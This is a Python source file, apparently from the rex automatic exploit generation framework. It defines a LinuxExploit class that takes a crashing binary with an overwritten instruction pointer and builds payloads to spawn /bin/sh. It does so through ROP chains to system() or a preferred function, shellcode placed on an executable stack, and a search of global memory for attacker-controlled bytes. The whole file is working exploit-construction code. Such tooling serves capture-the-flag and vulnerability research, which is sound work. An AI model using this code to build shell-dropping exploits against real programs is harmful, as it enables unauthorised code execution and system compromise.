from rex import Vulnerability
from rex.exploit.linux import LinuxShellcode
from rex.exploit import Exploit, CannotExploit

import logging
l = logging.getLogger("rex.exploit.linux.LinuxExploit")

class LinuxExploit(Exploit):
    '''
    Exploit object which can leak flags or set registers
    '''

    COMMANDS = ["/bin/sh\x00", "/bin/sh#", "/bin/sh;"]

    def __init__(self, crash, preferred_func=None, preferred_args=None, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param preferred_func: a preferred function to call during exploitation
        :param preferred_args: arguments to the prefered function
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''
        super(LinuxExploit, self).__init__(crash, use_rop_cache, rop_cache_file)

        self.preferred_func = preferred_func
        self.preferred_args = preferred_args

        self.shell = None

    def initialize(self):

        super(LinuxExploit, self).initialize()

        self._generate_shell()

    def drop_shell(self, filename=None):
        '''
        :return: a payload which will spawn an interactive shell
        '''

        if self.shell is None:
            return None

        if filename is not None:
            with open(filename, "wb") as f:
                f.write(self.shell)
        return self.shell

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.shell is not None

### EXPLOIT GENERATORS

    def _generate_shell(self):
        '''
        generate and set the shell dropper
        '''

        try:
            self.shell = self._generate_a_shell()
        except CannotExploit as e:
            l.warning("cannot generate a shell dropper exploit, %s", e.message)

    def _generate_a_shell(self):

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE or \
                self.crash.crash_type == Vulnerability.PARTIAL_IP_OVERWRITE:
            return self._ip_overwrite_shell()
        else:
            raise CannotExploit("exploitation of this vulnerability is unimplemented")

    def _ip_overwrite_shell(self):

        if not self.preferred_func is None:
            l.debug("ropping to preferred function")
            args = [ ] if self.preferred_args is None else self.preferred_args
            return self._rop_call_function(self.preferred_func, args)

        # generate a chain which drops a shell
        # methods:
        #    * call a command executing function already in the binary (system, execve)
        #    * execute shellcode if the stack is executable

        # if system exists in the binary we need a chain to call it and a controlled string
        # at a global address
        if "system" in self._p.loader.main_bin.plt:
            l.debug("system found in the binary, attempting to call it using rop")
            try:
                return self._rop_call_system()
            except CannotExploit:
                l.debug("system found in binary, but was unable to call it")
        if "execve" in self._p.loader.main_bin.plt:
            pass

        # try leakless

        if self._p.loader.main_bin.execstack:
            l.debug("stack is executable, attempting to call shellcode")
            try:
                return self._call_shellcode()
            except CannotExploit:
                l.debug("stack was executable, but couldn't get ip to shellcode")

        # then drop into something a user would find helpful

        raise CannotExploit("could not find command execution function in binary")

    def _call_shellcode(self):
        '''
        call shellcode
        TODO: implement other methods of getting to shellcode
            * is 'jmp esp' available?
            * do any registers contain pointers to a controlled region, do we have gadgets to jump there?
        '''

        sh_tuple = self._write_global_data(LinuxShellcode.binsh(self._p))
        if sh_tuple is None:
            raise CannotExploit("cannot write shellcode into binary")

        shc_addr, shc_constraint = sh_tuple

        exploit_state = self.state.copy()

        # add that our shellcode must exist
        exploit_state.add_constraints(shc_constraint)
        # add that control must be transfered to our shellcode
        exploit_state.add_constraints(exploit_state.regs.ip == shc_addr)

        if not exploit_state.satisfiable():
            raise CannotExploit("generated unsatisfiable shellcode exploit")

        return exploit_state.posix.dumps(0)

    def _rop_call_system(self):
        '''
        use rop to call system with a controlled string in the binary
        '''

        return self._rop_call_function("system", ["/bin/sh\x00"])

    def _rop_call_function(self, func, args):

        # see if there's a global address we can place our string to "/bin/sh"

        stcp = self.state.copy()
        # let's try to place our arguments in circumstantially
        bin_args = [ ]
        for arg in args:
            if isinstance(arg, str):
                str_tuple = self._write_global_data(arg)
                if str_tuple is None:
                    # TODO create a pre-chain which reads this string in
                    raise CannotExploit("cannot write command into binary")
                addr, addr_constraint = str_tuple
                stcp.add_constraints(addr_constraint)
                bin_args.append(addr)
            elif isinstance(arg, (int, long)): # ints just go into the chain
                bin_args.append(arg)
            else: # unknown, maybe it will just work
                l.debug("argument of unknown type: %r", arg)
                bin_args.append(arg)

        try:
            chain = self.rop_engine.func_call(func, bin_args)
        except CannotExploit:
            raise CannotExploit("unable to fit constructed chain into binary")

        st, chain_addr, offered_size = self._eip_overwrite_with_chain(chain, state=stcp)

        st.add_constraints(st.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str()))

        if not st.satisfiable():
            raise CannotExploit("generated unsatisfiable exploit")

        return st.posix.dumps(0)

    def _write_global_data(self, data):
        '''
        write @data into globally addressable memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''
        l.debug("looking for a global area to write '%s' circumstantially", data)

        glob_control = self._global_control()

        # try all variations of commands at every global address
        for base in glob_control:
            for addr in range(base, base+glob_control[base]):
                constraint = self.state.memory.load(addr, len(data)) == self.state.BVV(data)
                if self.state.se.satisfiable(extra_constraints=(constraint,)):
                    data_str_addr = addr
                    data_str_constraint = constraint
                    return (data_str_addr, data_str_constraint)

        return None
